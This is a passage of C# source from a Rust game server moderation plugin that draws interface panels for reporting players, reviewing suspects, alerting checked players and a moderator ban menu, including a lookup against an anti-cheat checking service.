                            new CuiRectTransformComponent{ AnchorMin = "0 0", AnchorMax = $"0.3600007 1"},
                         }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.3699992 0.6756751", AnchorMax = "1 1" },
                        Text = { Text = $"<b><size=8>{DisplayName}</size></b>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
                    }, $"PLAYER_{i}");

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.3699992 0.432432", AnchorMax = "1 0.7567569" },
                        Text = { Text = $"<size=10>{UserID}</size>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
                    }, $"PLAYER_{i}");

                    string CMDD = Moderation ? $"iqreport moderation_send {UserID}" : $"iqreport reports_menu {UserID}"; ///// DEBUG
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "2 0", OffsetMax = "22 75" },
                        Button = { Command = CMDD, Color = HexToRustFormat(Interface.HexPlayerButton) },
                        Text = { Text = "" }
                    }, $"PLAYER_{i}", $"BTN_ACTION_{i}");

                    container.Add(new CuiElement
                    {
                        Parent = $"BTN_ACTION_{i}",
                        Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = Interface.SpritePlayerButton },
                        new CuiRectTransformComponent { AnchorMin = "0 0.41", AnchorMax = "0.96 0.62" }
                    }
                    });

                    if (Moderation)
                    {
                        if (IsFake(UserID)) continue;

                        var InformationUser = ReportInformation[UserID];
                        string IsSteamSprite = IsSteam(UserID.ToString()) == lang.GetMessage("IS_STEAM_STATUS_LICENSE", this, UserID.ToString()) ? "assets/icons/steam.png" : "assets/icons/poison.png";

                        container.Add(new CuiLabel
                        {
                            RectTransform = { AnchorMin = "0.3699992 0.01801781", AnchorMax = "1 0.3042333" },
                            Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_REPORT_PANEL_PLAYER_REPORTEDS", this, UserID.ToString()), InformationUser.ReportCount), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
                        }, $"PLAYER_{i}");

                        container.Add(new CuiElement
                        {
                            Parent = $"PLAYER_{i}",
                            Components =
                        {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = IsSteamSprite },
                        new CuiRectTransformComponent { AnchorMin = "0.8500056 0.03801781", AnchorMax = "0.9900023 0.4632426" }
                        }
                        });
                    }

                    i++;
                    x++;
                    if (x == 4)
                    {
                        x = 0;
                        y++;
                    }
                    if (y == 5 && x == 0)
                        break;
                }
            else
            {
                foreach (var Plist in ActiviteList)
                {
                    ulong UserID = Plist.userID;
                    string DisplayName = Plist.displayName;
                    if (Friends != null)
                        if (config.Setting.FriendNoReport)
                            if ((bool)Friends.Call("HasFriend", player.userID, UserID)) continue;

                    if (UserID == player.userID) continue;
                    if (permission.UserHasPermission(UserID.ToString(), PermissionAdmin)) continue;

                    container.Add(new CuiPanel
                    {
                        RectTransform = { 
                            AnchorMin = $"{0.00246954 + (x * 0.2540)} {0.8671876 - (y * 0.2)}", 
                            AnchorMax = $"{0.2 + (x * 0.2540)} {0.9910715 - (y * 0.2)}" },
                        Image = { Color = HexToRustFormat(Interface.HexSearchPanel), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
                    }, PARENT_UI_PLAYER_PANEL, $"PLAYER_{i}");

                    string ImageAvatar = GetImage(UserID.ToString(), 0);
                    container.Add(new CuiElement
                    {
                        Parent = $"PLAYER_{i}",
                        Components =
                         {
                            new CuiRawImageComponent { Png = ImageAvatar,Color = HexToRustFormat("#FFFFFFAA") },
                            new CuiRectTransformComponent{ AnchorMin = "0 0", AnchorMax = $"0.3600007 1"},
                         }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.3699992 0.6756751", AnchorMax = "1 1" },
                        Text = { Text = $"<b><size=8>{DisplayName}</size></b>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
                    }, $"PLAYER_{i}");

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.3699992 0.432432", AnchorMax = "1 0.7567569" },
                        Text = { Text = $"<size=10>{UserID}</size>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
                    }, $"PLAYER_{i}");

                    string CMDD = Moderation ? $"iqreport moderation_send {UserID}" : $"iqreport reports_menu {UserID}"; 
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "2 0", OffsetMax = "14 52.5" },
                        Button = { Command = CMDD, Color = HexToRustFormat(Interface.HexPlayerButton) },
                        Text = { Text = "" }
                    }, $"PLAYER_{i}", $"BTN_ACTION_{i}");

                    container.Add(new CuiElement
                    {
                        Parent = $"BTN_ACTION_{i}",
                        Components =
                        {
                            new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = Interface.SpritePlayerButton },
                            new CuiRectTransformComponent { AnchorMin = "0 0.41", AnchorMax = "0.96 0.62" }
                        }
                    });

                    if (Moderation)
                    {
                        if (IsFake(UserID)) continue;

                        var InformationUser = ReportInformation[UserID];
                        string IsSteamSprite = IsSteam(UserID.ToString()) == lang.GetMessage("IS_STEAM_STATUS_LICENSE", this, UserID.ToString()) ? "assets/icons/steam.png" : "assets/icons/poison.png";

                        container.Add(new CuiLabel
                        {
                            RectTransform = { AnchorMin = "0.3699992 0.01801781", AnchorMax = "1 0.3042333" },
                            Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_REPORT_PANEL_PLAYER_REPORTEDS", this, UserID.ToString()), InformationUser.ReportCount), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
                        }, $"PLAYER_{i}");

                        container.Add(new CuiElement
                        {
                            Parent = $"PLAYER_{i}",
                            Components =
                        {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = IsSteamSprite },
                        new CuiRectTransformComponent { AnchorMin = "0.8500056 0.04801781", AnchorMax = "0.9900023 0.4632426" }
                        }
                        });
                    }

                    i++;
                    x++;
                    if (x == 4)
                    {
                        x = 0;
                        y++;
                    }
                    if (y == 5 && x == 0)
                        break;
                }
            }
            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region UI Send Report
        void UI_SendReport(BasePlayer player, ulong UserID)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, PARENT_UI_PLAYER_REPORT);
         //   ulong UserID = IQFakeActive ? PlayerBases.FirstOrDefault(x => x.UserID == UserID).use : BasePlayer.activePlayerList[BaseID].userID;
            string DisplayName = IQFakeActive ? PlayerBases.FirstOrDefault(j => j.UserID == UserID).DisplayName : BasePlayer.FindByID(UserID).displayName;

            var InterfaceReport = config.Setting.Interface.ReasonInterface;
            var Interface= config.Setting.Interface;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Image = { Color = HexToRustFormat("#21211AF2") }
            },  "Overlay", PARENT_UI_PLAYER_REPORT);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.25 0.1768519", AnchorMax = "0.7 0.8" },
                Image = { Color = HexToRustFormat(InterfaceReport.HexMain) }
            },  PARENT_UI_PLAYER_REPORT,"PANEL_MAIN_REPORT");

            #region TitlePanel

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.8662704", AnchorMax = "1 1" },
                Image = { Color = HexToRustFormat(InterfaceReport.HexTitlePanel) }
            },  "PANEL_MAIN_REPORT", "TITLE_PANEL");

            container.Add(new CuiElement
            {
                Parent = $"TITLE_PANEL",
                Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = InterfaceReport.SpriteTitlePanel },
                        new CuiRectTransformComponent { AnchorMin = "0.01851851 0.1000004", AnchorMax = "0.09259258 0.8111112" }
                    }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.09953713 0", AnchorMax = "1 0.6333335" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_TITLE",this,player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            },  "TITLE_PANEL");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.09953713 0.4444447", AnchorMax = "1 0.9" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_DESC", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "TITLE_PANEL");

            #endregion

            #region MainPanel
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.09143519 0.7028232", AnchorMax = "0.2731481 0.768202" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.5973254", AnchorMax = "1 0.6493313" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_LIST", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, "PANEL_MAIN_REPORT");

            string ImageAvatar = GetImage((string)UserID.ToString(), 0);
            container.Add(new CuiElement
            {
                Parent = $"PANEL_MAIN_REPORT",
                Components =
                 {
                    new CuiRawImageComponent { Png = ImageAvatar,Color = HexToRustFormat("#FFFFFFAA") },
                    new CuiRectTransformComponent{ AnchorMin = "0.33449 0.6909361", AnchorMax = $"0.4085641 0.7860327"},
                 }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.412036 0.7444279", AnchorMax = "0.9918982 0.7860327" },
                Text = { Text = $"<b><size=16>{DisplayName}</size></b>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.412036 0.6909361", AnchorMax = "0.9918982 0.7265974" },
                Text = { Text = $"<size=15>{UserID.ToString()}</size>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
            }, "PANEL_MAIN_REPORT");
            #endregion

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.3263901 0.01188706", AnchorMax = "0.6678232 0.08023772" },
                Button = { Close = PARENT_UI_PLAYER_REPORT, Color = HexToRustFormat(InterfaceReport.HexClose) },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_CLOSE",this,player.UserIDString), Align = TextAnchor.MiddleCenter }
            }, $"PANEL_MAIN_REPORT", $"BTN_CLOSE");

            container.Add(new CuiElement
            {
                Parent = $"BTN_CLOSE",
                Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = InterfaceReport.SpriteClose },
                        new CuiRectTransformComponent { AnchorMin = "0.006779703 0.04347827", AnchorMax = "0.1491535 0.9565219" }
                    }
            });

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.09509653", AnchorMax = "1 0.5884101" },
                Image = { Color = "0 0 0 0" }
            }, "PANEL_MAIN_REPORT", "PANEL_MAIN_REPORT_REASON");

            int x = 0, y = 0, i = 0;
            foreach(var Reason in config.ReasonReport)
            {
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"{0.06944443 + (x * 0.45)} {0.8253011 - (y * 0.2)}", AnchorMax = $"{0.4895834 + (x * 0.45)} {0.9879518 - (y * 0.2)}" },
                    Button = { Close = PARENT_UI_PLAYER_REPORT, Command = $"iqreport send_report {UserID} {i}", Color = HexToRustFormat(InterfaceReport.HexButton) },
                    Text = { Text = Reason, Align = TextAnchor.MiddleCenter, Color = HexToRustFormat(InterfaceReport.HexLabel) }
                }, $"PANEL_MAIN_REPORT_REASON", $"REASON_{i}");

                x++;
                i++;
                if (x == 2)
                {
                    x = 0;
                    y++;
                }
                if (x == 0 && y == 5)
                    break;
            }

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region UI Moder Report
        void UI_ModerReport(BasePlayer player, BasePlayer Suspect)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, PARENT_UI_MODER_REPORT);
            var InterfaceReport = config.Setting.Interface.ReasonInterface;
            var Interface = config.Setting.Interface;
            var Data = ReportInformation[Suspect.userID];

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Image = { Color = HexToRustFormat("#21211AF2") }
            }, "Overlay", PARENT_UI_MODER_REPORT);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.25 0.1768519", AnchorMax = "0.7 0.8" },
                Image = { Color = HexToRustFormat(InterfaceReport.HexMain) }
            }, PARENT_UI_MODER_REPORT, "PANEL_MAIN_REPORT");

            #region TitlePanel

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.8662704", AnchorMax = "1 1" },
                Image = { Color = HexToRustFormat(InterfaceReport.HexTitlePanel) }
            }, "PANEL_MAIN_REPORT", "TITLE_PANEL");

            container.Add(new CuiElement
            {
                Parent = $"TITLE_PANEL",
                Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = InterfaceReport.SpriteTitlePanel },
                        new CuiRectTransformComponent { AnchorMin = "0.01851851 0.1000004", AnchorMax = "0.09259258 0.8111112" }
                    }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.09953713 0", AnchorMax = "1 0.6333335" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "TITLE_PANEL");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.09953713 0.4444447", AnchorMax = "1 0.9" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_DESC", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "TITLE_PANEL");

            #endregion

            #region MainPanel
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.09143519 0.7028232", AnchorMax = "0.2731481 0.768202" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.5482913", AnchorMax = "1 0.6136701" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_MORE_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, "PANEL_MAIN_REPORT");

            string ImageAvatar = GetImage(Suspect.UserIDString, 0);
            container.Add(new CuiElement
            {
                Parent = $"PANEL_MAIN_REPORT",
                Components =
                 {
                    new CuiRawImageComponent { Png = ImageAvatar,Color = HexToRustFormat("#FFFFFFAA") },
                    new CuiRectTransformComponent{ AnchorMin = "0.33449 0.6909361", AnchorMax = $"0.4085641 0.7860327"},
                 }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.412036 0.7444279", AnchorMax = "0.9918982 0.7860327" },
                Text = { Text = $"<b><size=12>{Suspect.displayName}</size></b>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.412036 0.6909361", AnchorMax = "0.9918982 0.7265974" },
                Text = { Text = $"<size=12>{Suspect.UserIDString}</size>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
            }, "PANEL_MAIN_REPORT");
            #endregion

            #region MoreDetalis

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.00925926 0.4695395", AnchorMax = "0.3611112 0.5349182" },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_MORE_HISTORY_REPORT", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            },  "PANEL_MAIN_REPORT");

            string LastCheck = String.IsNullOrWhiteSpace(Data.LastCheckModerator) ? "Не был проверен" : Data.LastCheckModerator;
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.01041757 0.1738484", AnchorMax = "0.6319444 0.2392275" },
                Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_MORE_LAST_CHECK", this, player.UserIDString), LastCheck), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.0104176 0.127786", AnchorMax = "0.5497685 0.1931651" },
                Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_MORE_COUNT_CHECK", this, player.UserIDString), Data.CheckCount), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.6377296 0.1456166", AnchorMax = "0.8194424 0.2139673" },
                Text = { Text = String.Format(lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_MORE_REPORTS", this, player.UserIDString)), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.8275464 0.1411597", AnchorMax = "0.9953676 0.2243681" },
                Text = { Text = $"<size=12><b>{Data.ReportCount}</b></size>", Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, "PANEL_MAIN_REPORT");

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.009259251 0.2496285", AnchorMax = "0.3611112 0.4680535" },
                Image = { Color = "0 0 0 0" }
            }, "PANEL_MAIN_REPORT", "REPORT_HISTORY_PANEL");

            for (int i = 0; i < ReportInformation[Suspect.userID].ReportHistory.Count; i++)
            {
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = $"0 {0.7755102 - (i * 0.18)}", AnchorMax = $"1 {1 - (i * 0.18)}" },
                    Text = { Text = ReportInformation[Suspect.userID].ReportHistory[i], FontSize = 15, Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter, Color = HexToRustFormat(Interface.HexLabels) }
                },  "REPORT_HISTORY_PANEL", $"REASON_{i}");

                if (i >= 5) break;
            }

            if (config.RCCSetting.RCCUse)
            {
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.6400454 0.4695393", AnchorMax = "0.9918971 0.5349184" },
                    Text = { Text = lang.GetMessage("UI_NEW_MODERATION_MODER_GO_CHECK_MORE_HISTORY_RCC", this, player.UserIDString), Color = HexToRustFormat(Interface.HexLabels), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                }, "PANEL_MAIN_REPORT");

                string Key = config.RCCSetting.Key;
                if (!String.IsNullOrEmpty(Key))
                {
                    try
                    {
                        string API = $"https://rustcheatcheck.ru/panel/api?action=getInfo&key={Key}&player={Suspect.userID}";
                        webrequest.Enqueue(API, null, (code, response) =>
                        {
                            string ServersCheck = "Был проверен на серверах:";
                            var resources = JsonConvert.DeserializeObject<Response>(response);
                            if (resources.last_check == null)
                                ServersCheck += $"\nНе проверялся";
                            else
                            {
                                foreach (var resource in resources.last_check)
                                    ServersCheck += $"\n{resource.serverName}";
                            }

                            CuiHelper.DestroyUi(player, "LABELRCC");
                            CuiElementContainer RCCCONT = new CuiElementContainer();

                            RCCCONT.Add(new CuiLabel
                            {
                                RectTransform = { AnchorMin = $"0.6400445 0.3254086", AnchorMax = $"0.9918977 0.4665672" },
                                Text = { Text = ServersCheck, FontSize = 15, Font = "robotocondensed-regular.ttf", Align = TextAnchor.UpperCenter, Color = HexToRustFormat(Interface.HexLabels) }
                            }, "PANEL_MAIN_REPORT", "LABELRCC");

                            CuiHelper.AddUi(player, RCCCONT);
                        }, this);
                    }
                    catch (Exception ex) { }
                }
            }

            #endregion

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.1006964 0.01188706", AnchorMax = "0.4421295 0.08023772" },
                Button = { Close = PARENT_UI_MODER_REPORT, Color = HexToRustFormat(InterfaceReport.HexClose) },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_CLOSE", this, player.UserIDString), Align = TextAnchor.MiddleCenter }
            }, $"PANEL_MAIN_REPORT", $"BTN_CLOSE");

            container.Add(new CuiElement
            {
                Parent = $"BTN_CLOSE",
                Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = InterfaceReport.SpriteClose },
                        new CuiRectTransformComponent { AnchorMin = "0.006779703 0.04347827", AnchorMax = "0.1491535 0.9565219" }
                    }
            });

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.5462967 0.01188706", AnchorMax = "0.8877298 0.08023772" },
                Button = { Close = PARENT_UI_MODER_REPORT, Command = $"iqreport send_check {Suspect.userID}", Color = HexToRustFormat(InterfaceReport.HexButton) },
                Text = { Text = lang.GetMessage("UI_NEW_MODERATION_SEND_REPORT_PANEL_PLAYER_GOCHECK", this, player.UserIDString), Align = TextAnchor.MiddleCenter }
            }, $"PANEL_MAIN_REPORT", $"BTN_GO_CHECK");

            container.Add(new CuiElement
            {
                Parent = $"BTN_GO_CHECK",
                Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabels), Sprite = InterfaceReport.SpriteClose },
                        new CuiRectTransformComponent { AnchorMin = "0.006779703 0.04347827", AnchorMax = "0.1491535 0.9565219" }
                    }
            });

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region UI Alert Player Check
        void UI_AlertSendPlayer(BasePlayer Suspect)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(Suspect, PARENT_UI_ALERT_SEND);
            var InterfaceAlert = config.Setting.Interface.AlertInterface;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.575", AnchorMax = "1 0.8888889" },
                Image = { FadeIn = 0.15f, Color = HexToRustFormat(InterfaceAlert.HexMain), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
            }, "Overlay", PARENT_UI_ALERT_SEND);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.365625 0.2595869", AnchorMax = "0.6463541 0.2772861" },
                Image = { Color = HexToRustFormat(InterfaceAlert.HexTitle), Material = "assets/content/ui/uibackgroundblur-ingamemenu.mat" }
            },  PARENT_UI_ALERT_SEND);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.7079645", AnchorMax = "1 1" },
                Text = { Text = lang.GetMessage("UI_NEW_ALERT_PLAYER_WARNING",this, Suspect.UserIDString), Color = HexToRustFormat(InterfaceAlert.HexTitle), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperCenter }
            }, PARENT_UI_ALERT_SEND);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.2949852", AnchorMax = "1 0.761062" },
                Text = { Text = lang.GetMessage("UI_NEW_ALERT_PLAYER_TITLE", this, Suspect.UserIDString), Color = HexToRustFormat(InterfaceAlert.HexLabel), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperCenter }
            }, PARENT_UI_ALERT_SEND);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.2300885" },
                Text = { Text = lang.GetMessage("UI_NEW_ALERT_PLAYER_DESC", this, Suspect.UserIDString), Color = HexToRustFormat(InterfaceAlert.HexLabel), Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperCenter }
            }, PARENT_UI_ALERT_SEND);

            CuiHelper.AddUi(Suspect, container);
        }
        #endregion

        #region UI Moder Menu
        
        void UI_MiniPanelModerator(BasePlayer player, ulong SuspectID)
        {
            CuiHelper.DestroyUi(player, PARENT_UI_MODERATOR_MINI_PANEL);
            CuiElementContainer container = new CuiElementContainer();
            var Interface = config.Setting.Interface.ModderatorPanel;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "1 0", AnchorMax = "1 0", OffsetMin = "-450 15", OffsetMax = "-220 130" },
                Image = { Color = HexToRustFormat(Interface.HexMain) }
            }, "Overlay", PARENT_UI_MODERATOR_MINI_PANEL);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.7797101", AnchorMax = "1 1" },
                Image = { Color = HexToRustFormat(Interface.HexTitlePanel) }
            }, PARENT_UI_MODERATOR_MINI_PANEL, "TITLE_PANEL");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.1130258", AnchorMax = "1 1" }, 
                Text = { Text = lang.GetMessage("UI_NEW_MINI_PANEL_MODERATOR_TITLE", this, player.UserIDString), Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter, Color = HexToRustFormat(Interface.HexLabel) }
            },  "TITLE_PANEL");

            container.Add(new CuiElement
            {
                Parent = $"TITLE_PANEL",
                Components =
                    {
                        new CuiImageComponent {  Color = HexToRustFormat(Interface.HexLabel), Sprite = Interface.SpriteTitlePanel },
                        new CuiRectTransformComponent { AnchorMin = "0.005797102 0.07894736", AnchorMax = "0.09855073 0.9210525" }
                    }
            }); 
            
            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = $"0.008695543 0.03614452", AnchorMax = $"0.48 0.5" },
                Button = { Command = $"iqreport moderator_stop {SuspectID}", Color = HexToRustFormat(Interface.HexStopButton) },
                Text = { Text = lang.GetMessage("UI_NEW_MINI_PANEL_MODERATOR_STOP", this, player.UserIDString), Align = TextAnchor.MiddleCenter, Color = HexToRustFormat(Interface.HexLabel) }
            }, PARENT_UI_MODERATOR_MINI_PANEL);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = $"0.5188398 0.03614452", AnchorMax = $"0.9913077 0.5" },
                Button = { Command = $"iqreport moderator_reason_ban {SuspectID}", Color = HexToRustFormat(Interface.HexBanButton) },
                Text = { Text = lang.GetMessage("UI_NEW_MINI_PANEL_MODERATOR_BAN", this, player.UserIDString), Align = TextAnchor.MiddleCenter, Color = HexToRustFormat(Interface.HexLabel) }
            }, PARENT_UI_MODERATOR_MINI_PANEL);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.01159436 0.5478261", AnchorMax = "0.7072465 0.7333333" },
                Text = { Text = $"Discord : {PlayerSaveCheck[SuspectID].Discord}", FontSize = 12, Font = "robotocondensed-regular.ttf", Align = TextAnchor.UpperCenter, Color = HexToRustFormat("#FFFFFFFF") }
            }, PARENT_UI_MODERATOR_MINI_PANEL, UI_MODERATION_CHECK_MENU_DISCORD);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.6782616 0.5478261", AnchorMax = "0.9884076 0.7333333" },
                Text = { Text = $"{PlayerSaveCheck[SuspectID].StatusNetwork}", FontSize = 12, Font = "robotocondensed-regular.ttf", Align = TextAnchor.UpperCenter, Color = HexToRustFormat("#FFFFFFFF") }
            }, PARENT_UI_MODERATOR_MINI_PANEL, UI_MODERATION_CHECK_MENU_NETWORK);

            CuiHelper.AddUi(player, container);
        }
        void UI_OpenReasonsBan(BasePlayer player, ulong SuspectID)
        {
            CuiElementContainer container = new CuiElementContainer();
            var Interface = config.Setting.Interface.ModderatorPanel;

            for (int i = 0; i < config.ReasonBan.Count; i++)
            {
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"0 1", AnchorMax = $"0 1", OffsetMin = $"0 {2 + (i * 30)}", OffsetMax = $"230 {30 + (i * 30)}" },
                    Button = { FadeIn = 0.3f + (i / 10), Command = $"iqreport moderator_ban {SuspectID} {i}", Color = HexToRustFormat(Interface.HexBanButton) },
                    Text = { Text = config.ReasonBan[i].DisplayName, FontSize = 15, Align = TextAnchor.MiddleCenter, Color = HexToRustFormat(Interface.HexLabel) }
                },  PARENT_UI_MODERATOR_MINI_PANEL);
            }

            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region UI Raiting Moderation
        void UI_RaitingSend(BasePlayer player, BasePlayer Moderator)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, UI_MODERATION_RAITING);
            var Interface = config.Setting.Interface.RaitingInterface;

            container.Add(new CuiPanel
            {
